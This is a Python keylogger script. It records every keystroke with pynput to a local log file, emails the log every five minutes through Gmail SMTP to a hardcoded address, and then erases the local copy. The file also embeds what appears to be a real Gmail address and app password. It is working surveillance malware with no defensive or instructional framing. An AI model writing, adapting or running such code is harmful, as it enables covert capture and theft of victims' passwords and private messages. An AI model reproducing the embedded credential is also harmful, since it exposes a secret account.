import smtplib
import time
from email.mime.text import MIMEText

from pynput.keyboard import Listener


def send_email(subject, message, from_email, to_email, password):
    try:
        msg = MIMEText(message)
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()

        print("Email sent successfully.")
    except Exception as e:
        print("An error occurred:", e)


def key_press(key):
    key = str(key)
    if key == "key.f10":
        raise SystemExit(0)
    key = key.replace("'", "")

    if key == "Key.space":
        key = " "
    if key == "Key.enter":
        key = "\n"
    if key == "Key.shift":
        key = ""
    if key == "Key.shift_r":
        key = ""
    if key == "Key.backspace":
        key = ""
    if key == "Key.ctrl_l":
        key = ""

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key)


def main():
    from_email = 'mrdunghr@gmail.com'
    app_password = 'zcnkuptsmslbdujc'
    to_email = 'mrdunghr@gmail.com'
    subject = 'Keylogger Log'

    obj = Listener(on_press=key_press)
    obj.start()

    log_content = ""

    while True:
        try:
            time.sleep(300)
            obj.stop()

            with open("log.txt", "r", encoding="utf-8") as f:
                log_content = f.read()

            message = f'Nội dung keylogger:\n\n{log_content}'
            send_email(subject, message, from_email, to_email, app_password)

            # xóa log sau khi gửi mail
            with open("log.txt", "w", encoding="utf-8") as f:
                f.write("")

            obj = Listener(on_press=key_press)
            obj.start()

        except KeyboardInterrupt:
            obj.stop()
            break

    obj.join()


if __name__ == "__main__":
    main()
